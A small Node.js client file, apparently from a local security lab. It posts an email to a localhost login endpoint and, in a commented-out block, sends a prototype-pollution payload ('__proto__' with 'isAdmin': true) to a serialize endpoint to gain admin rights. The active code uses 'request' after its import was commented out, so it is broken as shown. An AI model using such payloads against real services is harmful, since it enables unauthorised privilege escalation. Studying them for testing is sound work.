// client.js
// const request = require('request');
import readline from 'readline';
// const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('Enter your email: ', (email) => {
    const loginData = {
        email: email
    };

    request.post({
        url: 'http://localhost:3000/api/login',
        json: loginData
    }, (error, response, body) => {
        if (error) {
            console.error('Error:', error);
        } else {
            console.log('Response:', body);
        }
    });

    rl.close();
});

// // client.js
// const request = require('request');

// const serializedPayload = '{"__proto__":{"isAdmin":true}}'; // Serialized payload with injected object

// request.post({
//     url: 'http://localhost:3000/api/serialize',
//     json: { data: serializedPayload }
// }, (error, response, body) => {
//     if (error) {
//         console.error('Error:', error);
//     } else {
//         console.log('Response:', body);
//     }
// });
